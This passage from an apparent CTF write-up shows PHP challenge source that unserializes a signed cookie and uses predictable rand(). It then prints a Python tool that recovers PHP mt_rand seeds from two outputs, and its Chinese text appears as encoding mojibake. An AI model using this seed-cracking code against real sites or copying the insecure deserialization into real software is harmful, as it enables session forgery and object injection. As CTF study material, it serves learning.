class="string">&#x27;SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $welcomeMsg = <span class="string">&#x27;%s, Welcome to Ordinal Scale!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sign = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $rank;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$playerName</span>)</span>&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;player&#x27;</span>] = $playerName;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">&#x27;exp&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [$playerName, <span class="keyword">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monster = <span class="keyword">new</span> Monster(<span class="keyword">$this</span>-&gt;sign);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = <span class="keyword">new</span> Rank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, $value);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $rank;</span><br><span class="line">    <span class="keyword">private</span> $serverKey;    </span><br><span class="line">    <span class="keyword">private</span> $key = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;rank&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set(rand(<span class="number">2</span>, <span class="number">1000</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set($_SESSION[<span class="string">&#x27;rank&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span>(<span class="params">$no</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = $no;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Fight</span>(<span class="params">$monster</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($monster[<span class="string">&#x27;no&#x27;</span>] &gt;= <span class="keyword">$this</span>-&gt;rank)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rank -= rand(<span class="number">5</span>, <span class="number">15</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rank &lt;= <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;rank = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_SESSION[<span class="string">&#x27;exp&#x27;</span>] += rand(<span class="number">20</span>, <span class="number">200</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;result&#x27;</span> =&gt; <span class="literal">true</span>, </span><br><span class="line">                <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;&lt;span style=&quot;color:green;&quot;&gt;Congratulations! You win! &lt;/span&gt;&#x27;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;result&#x27;</span> =&gt; <span class="literal">false</span>, </span><br><span class="line">                <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;&lt;span style=&quot;color:red;&quot;&gt;You die!&lt;/span&gt;&#x27;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// ç¡®ä¿ç¨‹åºæ˜¯è·‘åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;serverKey = $_SERVER[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key === <span class="keyword">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            $_SESSION[<span class="string">&#x27;rank&#x27;</span>] = <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// éæ­£å¸¸è®¿é—®</span></span><br><span class="line">            session_start();</span><br><span class="line">            session_destroy();</span><br><span class="line">            setcookie(<span class="string">&#x27;monster&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monster</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $monsterData;</span><br><span class="line">    <span class="keyword">private</span> $encryptKey;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;encryptKey = $key;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;monster&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $monsterData = base64_decode($_COOKIE[<span class="string">&#x27;monster&#x27;</span>]);  </span><br><span class="line">        <span class="keyword">if</span>(strlen($monsterData) &gt; <span class="number">32</span>)&#123;              </span><br><span class="line">            $sign = substr($monsterData, <span class="number">-32</span>);</span><br><span class="line">            $monsterData = substr($monsterData, <span class="number">0</span>, strlen($monsterData) - <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span>(md5($monsterData . <span class="keyword">$this</span>-&gt;encryptKey) === $sign)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;monsterData = unserialize($monsterData); </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                session_destroy();</span><br><span class="line">                setcookie(<span class="string">&#x27;monster&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set();     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $monsterName = [<span class="string">&#x27;æ— åå°æ€ª&#x27;</span>, <span class="string">&#x27;BOSS: The Kernal Cosmos&#x27;</span>, <span class="string">&#x27;å°æ€ª: Big Eggplant&#x27;</span>, <span class="string">&#x27;BOSS: The Mole King&#x27;</span>, <span class="string">&#x27;BOSS: Zero Zone Witch&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monsterData = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; $monsterName[array_rand($monsterName, <span class="number">1</span>)],</span><br><span class="line">            <span class="string">&#x27;no&#x27;</span> =&gt; rand(<span class="number">1</span>, <span class="number">2000</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;monsterData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">Save</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $sign = md5(serialize(<span class="keyword">$this</span>-&gt;monsterData) . <span class="keyword">$this</span>-&gt;encryptKey);</span><br><span class="line">        setcookie(<span class="string">&#x27;monster&#x27;</span>, base64_encode(serialize(<span class="keyword">$this</span>-&gt;monsterData) . $sign));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="äºŒå‘å…¥é­‚ï¼"><a href="#äºŒå‘å…¥é­‚ï¼" class="headerlink" title="äºŒå‘å…¥é­‚ï¼"></a>äºŒå‘å…¥é­‚ï¼</h4><p>è¿™é‡Œæä¾›ä¸€ä¸ªæ–°æ€è·¯æ¥ç®—å‡ºç§å­ï¼š<a href="https://www.ambionics.io/blog/php-mt-rand-prediction">https://www.ambionics.io/blog/php-mt-rand-prediction</a></p><p>å®‰å…¨å®¢ç¿»è¯‘æ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/196831">https://www.anquanke.com/post/id/196831</a></p><p>ç®€å•çš„è¯´ï¼Œå°±æ˜¯å¦‚æœçŸ¥é“æŸä¸ªéšæœºæ•°çš„å€¼ä»¥åŠè¿™ä¸ªéšæœºæ•°å‰éšæœºæ•°çš„ä¸ªæ•°ï¼Œå¹¶ä¸”çŸ¥é“ä¸ç›¸éš”226ä¸ªéšæœºæ•°çš„çš„å€¼ï¼Œå°±å¯ä»¥ç®—å‡ºseedï¼Œå½“ç„¶è¿™ä¸ªéšæœºæ•°å¯ä»¥æ˜¯ç¬¬ä¸€ä¸ªéšæœºæ•°ï¼Œè¿™æ—¶å€™åªéœ€çŸ¥é“ç¬¬227ä¸ªéšæœºæ•°çš„å€¼å°±å¯ä»¥äº†</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.7</span></span><br><span class="line"><span class="comment"># Charles Fol</span></span><br><span class="line"><span class="comment"># @cfreal_</span></span><br><span class="line"><span class="comment"># 2020-01-04 (originally la long time ago ~ 2010)</span></span><br><span class="line"><span class="comment"># Breaking mt_rand() with two output values and no bruteforce.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">R = final rand value</span></span><br><span class="line"><span class="string">S = merged state value</span></span><br><span class="line"><span class="string">s = original state value</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">N = <span class="number">624</span></span><br><span class="line">M = <span class="number">397</span></span><br><span class="line"></span><br><span class="line">MAX = <span class="number">0xffffffff</span></span><br><span class="line">MOD = MAX + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># STATE_MULT * STATE_MULT_INV = 1 (mod MOD)</span></span><br><span class="line">STATE_MULT = <span class="number">1812433253</span></span><br><span class="line">STATE_MULT_INV = <span class="number">2520285293</span></span><br><span class="line"></span><br><span class="line">MT_RAND_MT19937 = <span class="number">1</span></span><br><span class="line">MT_RAND_PHP = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_initialize</span>(<span class="params">seed</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates the initial state array from a seed.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    state = [<span class="literal">None</span>] * N</span><br><span class="line">    state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N):</span><br><span class="line">        r = state[i<span class="number">-1</span>]</span><br><span class="line">        state[i] = ( STATE_MULT * ( r ^ (r &gt;&gt; <span class="number">30</span>) ) + i ) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_initialize</span>(<span class="params">s, p</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;From an initial state value `s` at position `p`, find out seed.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># We have:</span></span><br><span class="line">    <span class="comment"># state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000</span></span><br><span class="line">    <span class="comment"># and:</span></span><br><span class="line">    <span class="comment"># (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)</span></span><br><span class="line">    <span class="comment"># =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(p, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        s = _undo_php_mt_initialize(s, i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_undo_php_mt_initialize</span>(<span class="params">s, i</span>):</span></span><br><span class="line">    s = (STATE_MULT_INV * (s - i)) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> s ^ s &gt;&gt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_rand</span>(<span class="params">s1</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Converts a merged state value `s1` into a random value, then sent to the</span></span><br><span class="line"><span class="string">    user.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt;  <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_rand</span>(<span class="params">s1</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Retrieves the merged state value from the value sent to the user.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    </span><br><span class="line">    s1 = undo_lshift_xor_mask(s1, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">    </span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">11</span></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">22</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_lshift_xor_mask</span>(<span class="params">v, shift, mask</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(shift, <span class="number">32</span>, shift):</span><br><span class="line">        v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits</span>(<span class="params">v, start, size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> lobits(v &gt;&gt; start, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lobits</span>(<span class="params">v, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; ((<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit</span>(<span class="params">v, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; (<span class="number">1</span> &lt;&lt; b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bv</span>(<span class="params">v, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> bit(v, b) &gt;&gt; b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_reload</span>(<span class="params">state, flavour</span>):</span></span><br><span class="line">    s = state</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, N - M):</span><br><span class="line">        s[i] = _twist_php(s[i+M], s[i], s[i+<span class="number">1</span>], flavour)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N - M, N - <span class="number">1</span>):</span><br><span class="line">        s[i] = _twist_php(s[i+M-N], s[i], s[i+<span class="number">1</span>], flavour)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_twist_php</span>(<span class="params">m, u, v, flavour</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates the `twist` and `twist_php` #defines.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span> <span class="keyword">if</span> (u <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">else</span> v) &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> m ^ (((u &amp; <span class="number">0x80000000</span>) | (v &amp; <span class="number">0x7FFFFFFF</span>)) &gt;&gt; <span class="number">1</span>) ^ mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_reload</span>(<span class="params">S000, S227, offset, flavour</span>):</span></span><br><span class="line">    <span class="comment">#define twist_php(m,u,v)  (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU))</span></span><br><span class="line">    <span class="comment"># m S000</span></span><br><span class="line">    <span class="comment"># u S227</span></span><br><span class="line">    <span class="comment"># v S228</span></span><br><span class="line">    X = S000 ^ S227</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># This means the mask was applied, and as such that S227&#x27;s LSB is 1</span></span><br><span class="line">    s22X_0 = bv(X, <span class="number">31</span>)</span><br><span class="line">    <span class="comment"># remove mask if present</span></span><br><span class="line">    <span class="keyword">if</span> s22X_0:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Another easy guess</span></span><br><span class="line">    s227_31 = bv(X, <span class="number">30</span>)</span><br><span class="line">    <span class="comment"># remove bit if present</span></span><br><span class="line">    <span class="keyword">if</span> s227_31:</span><br><span class="line">        X ^= <span class="number">1</span> &lt;&lt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># We&#x27;re missing bit 0 and bit 31 here, so we have to try every possibility</span></span><br><span class="line">    s228_1_30 = (X &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> s228_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> s228_31 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_MT19937 <span class="keyword">and</span> s22X_0 != s228_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s228 = s228_0 | s228_31 &lt;&lt; <span class="number">31</span> | s228_1_30</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the results are consistent with the known bits of s227</span></span><br><span class="line">            s227 = _undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">and</span> bv(s227, <span class="number">0</span>) != s22X_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> bv(s227, <span class="number">31</span>) != s227_31:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Check if the guessed seed yields S000 as its first scrambled state</span></span><br><span class="line">            rand = undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            state = php_mt_initialize(rand)</span><br><span class="line">            php_mt_reload(state, flavour)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (S000 == state[offset]):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> rand</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">_R000, _R227, offset, flavour</span>):</span></span><br><span class="line">    <span class="comment"># Both were &gt;&gt; 1, so the leftmost byte is unknown</span></span><br><span class="line">    _R000 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    _R227 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> R000_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> R227_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            R000 = _R000 | R000_0</span><br><span class="line">            R227 = _R227 | R227_0</span><br><span class="line">            S000 = undo_php_mt_rand(R000)</span><br><span class="line">            S227 = undo_php_mt_rand(R227)</span><br><span class="line">            seed = undo_php_mt_reload(S000, S227, offset, flavour)</span><br><span class="line">            <span class="keyword">if</span> seed:</span><br><span class="line">                <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_do_undo</span>(<span class="params">do, undo</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">        rand = random.randrange(<span class="number">1</span>, MAX)</span><br><span class="line">        done = do(rand)</span><br><span class="line">        undone = undo(done)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> rand == undone:</span><br><span class="line">            print(<span class="string">f&quot;-- <span class="subst">&#123;i&#125;</span> ----&quot;</span>)</span><br><span class="line">            print(bin(rand).rjust(<span class="number">34</span>))</span><br><span class="line">            print(bin(undone).rjust(<span class="number">34</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    